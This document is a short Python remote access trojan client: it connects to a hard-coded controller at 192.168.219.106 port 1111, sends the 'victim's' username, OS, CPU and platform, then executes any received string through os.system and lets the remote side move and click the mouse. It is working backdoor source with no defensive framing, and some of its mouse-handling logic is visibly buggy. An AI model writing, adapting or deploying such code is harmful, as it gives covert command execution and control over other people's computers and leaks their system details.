from socket import *
import os
import platform
import getpass
import mouse
import pyautogui
from time import sleep
username = "\nVictim's computer username : "+getpass.getuser()
infor="\nVictim's computer OS version : "+platform.platform()
cpuinfo="\nVictim's computer CPU : "+platform.processor()
sysinfo="\nVictim's computer platform : "+platform.system()
ip="192.168.219.106"
port=1111
clientSock = socket(AF_INET, SOCK_STREAM)
clientSock.connect((ip,port))
clientSock.send(infor.encode('utf-8'))
clientSock.send(sysinfo.encode('utf-8'))
clientSock.send(cpuinfo.encode('utf-8'))
clientSock.send(username.encode('utf-8'))
while True:
    recvData = clientSock.recv(1024)
    recvData=recvData.decode('utf-8')
    if recvData == "Remote_Control":
        while True:
            position=pyautogui.position()
            recvData = clientSock.recv(1024)#300,300
            locate=recvData.decode('utf-8')
            if locate == "click:left":
                pyautogui.click()
            
            elif locate == "click:right":
                pyautogui.click(button="right")
            
            else:
                recvData = position
                if "(" and ")" in recvData:
                    locate=locate.split("(")
                    locate=locate[1].split(")")
                    locate=locate[0]
                locate=str(locate)
                var=[]
                var1=locate.split(",")
                var.append(var1[0])
                var.append(var1[1])
                mouse.move(var[0],var[1])
                sleep(0.1)
            
    else:
        os.system(recvData)
        sendData = "OK"
        clientSock.send(sendData.encode('utf-8'))
